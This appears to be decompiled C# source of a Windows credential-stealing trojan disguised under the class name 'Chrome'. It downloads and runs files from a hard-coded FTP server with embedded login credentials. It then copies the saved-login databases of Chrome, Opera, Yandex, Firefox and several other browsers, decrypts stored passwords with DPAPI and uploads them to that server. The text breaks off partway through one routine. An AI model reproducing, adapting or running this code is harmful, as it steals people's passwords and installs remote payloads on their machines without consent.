using System;
using System.Data;
using System.Data.Common;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using StateInternetConnection;

public class Chrome
{
	private static void Main(string[] args)
	{
		while (true)
		{
			InternetConnection internetConnection = new InternetConnection();
			internetConnection.Init();
			if (internetConnection.IsInternetConnected)
			{
				break;
			}
			Thread.Sleep(15000);
		}
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://passnovawin7.viptop.ru/dllka/Zagruzka.exe");
		ftpWebRequest.Method = "RETR";
		ftpWebRequest.Credentials = new NetworkCredential("w457107", "q267dkhq");
		FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
		Stream responseStream = ftpWebResponse.GetResponseStream();
		string path = Environment.ExpandEnvironmentVariables("SustemWin.exe");
		FileStream fileStream = File.Create(path);
		byte[] array = new byte[32768];
		int count;
		while ((count = responseStream.Read(array, 0, array.Length)) > 0)
		{
			fileStream.Write(array, 0, count);
		}
		fileStream.Close();
		responseStream.Close();
		ftpWebResponse.Close();
		string text = Environment.ExpandEnvironmentVariables("SustemWin.exe");
		string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Sustem_Win7.exe");
		File.Copy(text, destFileName, overwrite: true);
		File.Delete(text);
		FtpWebRequest ftpWebRequest2 = (FtpWebRequest)WebRequest.Create("ftp://passnovawin7.viptop.ru/dllka/Sustem.bat");
		ftpWebRequest2.Method = "RETR";
		ftpWebRequest2.Credentials = new NetworkCredential("w457107", "q267dkhq");
		FtpWebResponse ftpWebResponse2 = (FtpWebResponse)ftpWebRequest2.GetResponse();
		Stream responseStream2 = ftpWebResponse2.GetResponseStream();
		string path2 = Environment.ExpandEnvironmentVariables("SustemPC.bat");
		FileStream fileStream2 = File.Create(path2);
		byte[] array2 = new byte[32768];
		int count2;
		while ((count2 = responseStream2.Read(array2, 0, array2.Length)) > 0)
		{
			fileStream2.Write(array2, 0, count2);
		}
		fileStream2.Close();
		responseStream2.Close();
		ftpWebResponse2.Close();
		string text2 = Environment.ExpandEnvironmentVariables("SustemPC.bat");
		string text3 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\SustemPC.bat");
		File.Copy(text2, text3, overwrite: true);
		File.Delete(text2);
		Process.Start(text3);
		FtpWebRequest ftpWebRequest3 = (FtpWebRequest)WebRequest.Create("ftp://passnovawin7.viptop.ru/dllka/System.Data.SQLite.DLL");
		ftpWebRequest3.Method = "RETR";
		ftpWebRequest3.Credentials = new NetworkCredential("w457107", "q267dkhq");
		FtpWebResponse ftpWebResponse3 = (FtpWebResponse)ftpWebRequest3.GetResponse();
		Stream responseStream3 = ftpWebResponse3.GetResponseStream();
		string path3 = Environment.ExpandEnvironmentVariables("System.Data.SQLite.DLL");
		FileStream fileStream3 = File.Create(path3);
		byte[] array3 = new byte[32768];
		int count3;
		while ((count3 = responseStream3.Read(array3, 0, array3.Length)) > 0)
		{
			fileStream3.Write(array3, 0, count3);
		}
		fileStream3.Close();
		responseStream3.Close();
		ftpWebResponse3.Close();
		string sourceFileName = Environment.ExpandEnvironmentVariables("System.Data.SQLite.DLL");
		string destFileName2 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\System.Data.SQLite.DLL");
		File.Copy(sourceFileName, destFileName2, overwrite: true);
		string path4 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data");
		string path5 = Environment.ExpandEnvironmentVariables("%APPDATA%\\Opera Software\\Opera Stable\\Login Data");
		string path6 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
		string path7 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Nichrome\\User Data\\Default\\Login Data");
		string path8 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Amigo\\User Data\\Default\\Login Data");
		string path9 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Xpom\\User Data\\Default\\Login Data");
		string path10 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Comodo\\Dragon\\User Data\\Default\\Login Data");
		string path11 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Torch\\User Data\\Default\\Login Data");
		string path12 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\MapleStudio\\ChromePlus\\User Data\\Default\\Login Data");
		string path13 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\QIP Surf\\User Data\\Default\\Login Data");
		string text4 = Environment.ExpandEnvironmentVariables("%APPDATA%\\Opera\\");
		string path14 = Environment.ExpandEnvironmentVariables(text4 + "Opera\\wand.dat");
		string text5 = Environment.ExpandEnvironmentVariables("%APPDATA%\\Mozilla\\Firefox");
		string path15 = Environment.ExpandEnvironmentVariables(text5 + "\\Profiles");
		if (File.Exists(path4))
		{
			googlebrayzer();
		}
		if (File.Exists(path5))
		{
			Operabrayzer();
		}
		if (File.Exists(path6))
		{
			yandexbrayzer();
		}
		if (File.Exists(path9))
		{
			odnoklassnikibrayzer();
		}
		if (File.Exists(path7))
		{
			ramblerbrayzer();
		}
		if (File.Exists(path8))
		{
			amigobrayzer();
		}
		if (File.Exists(path13))
		{
			QIPSurfbrayzer();
		}
		if (File.Exists(path10))
		{
			ComodoDragonbrayzer();
		}
		if (File.Exists(path11))
		{
			Torchbrayzer();
		}
		if (File.Exists(path12))
		{
			CoolNovobrayzer();
		}
		if (File.Exists(path14))
		{
			Opera12brayzer();
		}
		if (!Directory.Exists(path15))
		{
			return;
		}
		string[] directories = Directory.GetDirectories(path15);
		for (int i = 0; i < directories.Length; i++)
		{
			if (Directory.Exists(directories[i]))
			{
				string path16 = Environment.ExpandEnvironmentVariables(directories[i] + "\\key3.db");
				string path17 = Environment.ExpandEnvironmentVariables(directories[i] + "\\signons.sqlite");
				if (File.Exists(path16))
				{
					Firefox15brayzer();
				}
				if (File.Exists(path17))
				{
					Firefox16brayzer();
				}
			}
		}
	}

	private static void googlebrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\google_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\google_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "Google" + num + Environment.UserName + ".html";
			string ftpfilepath = "/Google" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void Opera12brayzer()
	{
		string text = Environment.ExpandEnvironmentVariables("%APPDATA%\\Opera\\");
		string sourceFileName = Environment.ExpandEnvironmentVariables(text + "Opera\\wand.dat");
		Random random = new Random();
		int num = random.Next(999999999);
		string text2 = "wand" + num + Environment.UserName + ".dat";
		string ftpfilepath = "/wand" + num + Environment.UserName + ".dat";
		string text3 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text2);
		File.Copy(sourceFileName, text3, overwrite: true);
		ftpfile(ftpfilepath, text3);
	}

	private static void Firefox15brayzer()
	{
		string text = Environment.ExpandEnvironmentVariables("%APPDATA%\\Mozilla\\Firefox");
		string path = Environment.ExpandEnvironmentVariables(text + "\\Profiles");
		string[] directories = Directory.GetDirectories(path);
		string sourceFileName = Environment.ExpandEnvironmentVariables(directories[0] + "\\key3.db");
		Random random = new Random();
		int num = random.Next(999999999);
		string text2 = "key3" + num + Environment.UserName + ".db";
		string ftpfilepath = "/key3" + num + Environment.UserName + ".db";
		string text3 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text2);
		File.Copy(sourceFileName, text3, overwrite: true);
		ftpfile(ftpfilepath, text3);
	}

	private static void Firefox16brayzer()
	{
		string text = Environment.ExpandEnvironmentVariables("%APPDATA%\\Mozilla\\Firefox");
		string path = Environment.ExpandEnvironmentVariables(text + "\\Profiles");
		string[] directories = Directory.GetDirectories(path);
		string sourceFileName = Environment.ExpandEnvironmentVariables(directories[0] + "\\signons.sqlite");
		Random random = new Random();
		int num = random.Next(999999999);
		string text2 = "signons" + num + Environment.UserName + ".sqlite";
		string ftpfilepath = "/signons" + num + Environment.UserName + ".sqlite";
		string text3 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text2);
		File.Copy(sourceFileName, text3, overwrite: true);
		ftpfile(ftpfilepath, text3);
	}

	private static void Operabrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%APPDATA%\\Opera Software\\Opera Stable\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Opera_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Opera_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "Opera" + num + Environment.UserName + ".html";
			string ftpfilepath = "/Opera" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void yandexbrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\yandex_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\yandex_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "Yandex" + num + Environment.UserName + ".html";
			string ftpfilepath = "/Yandex" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void QIPSurfbrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\QIP Surf\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\QIPSurf_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\QIPSurf_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "QIPSurf" + num + Environment.UserName + ".html";
			string ftpfilepath = "/QIPSurf" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void ramblerbrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Nichrome\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\rambler_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\rambler_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "rambler" + num + Environment.UserName + ".html";
			string ftpfilepath = "/rambler" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void amigobrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Amigo\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\amigo_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\amigo_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "amigo" + num + Environment.UserName + ".html";
			string ftpfilepath = "/amigo" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void odnoklassnikibrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Xpom\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\odnoklassniki_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\odnoklassniki_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "odnoklassniki" + num + Environment.UserName + ".html";
			string ftpfilepath = "/odnoklassniki" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void ComodoDragonbrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Comodo\\Dragon\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\ComodoDragon_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\ComodoDragon_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "ComodoDragon" + num + Environment.UserName + ".html";
			string ftpfilepath = "/ComodoDragon" + num + Environment.UserName + ".html";
			string text5 = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\" + text4);
			string text6 = Environment.ExpandEnvironmentVariables("Sustem.html");
			File.Copy(text6, text5, overwrite: true);
			File.Delete(text6);
			ftpfile(ftpfilepath, text5);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Exception innerException = ex.InnerException;
		}
	}

	private static void Torchbrayzer()
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		try
		{
			string sourceFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Torch\\User Data\\Default\\Login Data");
			string destFileName = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Torch_Login Data");
			File.Copy(sourceFileName, destFileName, overwrite: true);
			string path = "Sustem.html";
			StreamWriter streamWriter = new StreamWriter(path, append: false, Encoding.UTF8);
			string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%\\Torch_Login Data");
			string arg = "logins";
			byte[] entropyBytes = null;
			string text2 = "data source=" + text + ";New=True;UseUTF16Encoding=True";
			DataTable dataTable = new DataTable();
			string text3 = string.Format("SELECT * FROM {0} {1} {2}", arg, "", "");
			SQLiteConnection val = new SQLiteConnection(text2);
			try
			{
				SQLiteCommand val2 = new SQLiteCommand(text3, val);
				SQLiteDataAdapter val3 = new SQLiteDataAdapter(val2);
				((DbDataAdapter)(object)val3).Fill(dataTable);
				int count = dataTable.Rows.Count;
				for (int i = 0; i < count; i++)
				{
					streamWriter.Write(i + 1 + ") ");
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][1], "<br>"));
					streamWriter.WriteLine(string.Concat(dataTable.Rows[i][3], "<br>"));
					byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
					string description;
					byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out description);
					string @string = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetString(bytes);
					streamWriter.WriteLine(@string + "<br><br>");
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			streamWriter.Close();
			Random random = new Random();
			int num = random.Next(999999999);
			string text4 = "Torch" + num + Environment.UserName + ".html";
